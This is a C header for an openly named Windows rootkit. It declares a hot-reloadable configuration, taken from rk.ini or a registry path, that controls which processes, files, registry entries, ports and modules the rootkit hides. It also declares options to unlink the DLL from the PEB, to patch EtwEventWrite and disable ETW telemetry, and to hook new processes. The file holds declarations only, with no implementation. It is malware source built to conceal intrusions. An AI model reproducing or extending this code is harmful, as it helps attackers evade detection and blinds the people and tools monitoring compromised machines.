/*
 * config.h - Hot-reloadable configuration for the rootkit
 *
 * The configuration lives in rk.ini next to the DLL (or at the absolute
 * path set by the RkConfigPath registry value under HKLM\SOFTWARE\Rk).
 * A watcher thread reloads the file when its timestamp changes, so hiding
 * rules can be changed at runtime without restarting the host process.
 */
#ifndef RK_CONFIG_H
#define RK_CONFIG_H

#include <stdint.h>
#include <wchar.h>

#ifdef __cplusplus
extern "C" {
#endif

#define RK_MAX_ITEMS   64
#define RK_MAX_NAME    260

typedef struct rk_config {
    /* [HideProcess] - ImageName matches, e.g. "cmd.exe", "tool*" */
    wchar_t     processes[RK_MAX_ITEMS][RK_MAX_NAME];
    int         process_count;

    /* [HideFile] - file name (no path) wildcard match, e.g. "payload*.exe" */
    wchar_t     files[RK_MAX_ITEMS][RK_MAX_NAME];
    int         file_count;

    /* [HideRegistry] - value or key name wildcard match */
    wchar_t     registry[RK_MAX_ITEMS][RK_MAX_NAME];
    int         registry_count;

    /* [HidePort] - local TCP/UDP port numbers to conceal */
    uint16_t    ports[RK_MAX_ITEMS];
    int         port_count;

    /* [HideModule] - module name to unlink from the PEB loader list */
    wchar_t     modules[RK_MAX_ITEMS][RK_MAX_NAME];
    int         module_count;

    /* [Advanced] */
    int         self_hide;          /* unlink the DLL itself from PEB  */
    int         disable_etw;        /* patch EtwEventWrite in ntdll    */
    int         hook_injector;      /* 1: also hook new processes      */
} rk_config;

/* Load/parse the ini file. Returns 0 on success. thread-safe via SRWLOCK. */
int  rk_config_load(rk_config *cfg);

/* Snapshot the current configuration into *dst (caller provides storage). */
void rk_config_snapshot(rk_config *dst);

/* Returns 1 when rk.ini has been modified since the last rk_config_load().
 * Cheap (a single GetFileAttributesExW) - poll this, not rk_config_load(). */
int  rk_config_changed(void);

/* Wildcard matcher supporting '*' and '?' (case-insensitive, wide). */
int  rk_wcsw(const wchar_t *pattern, const wchar_t *str);

/* Resolve the config path used by this process. */
void rk_config_path(wchar_t *out, int out_len);

#ifdef __cplusplus
}
#endif

#endif /* RK_CONFIG_H */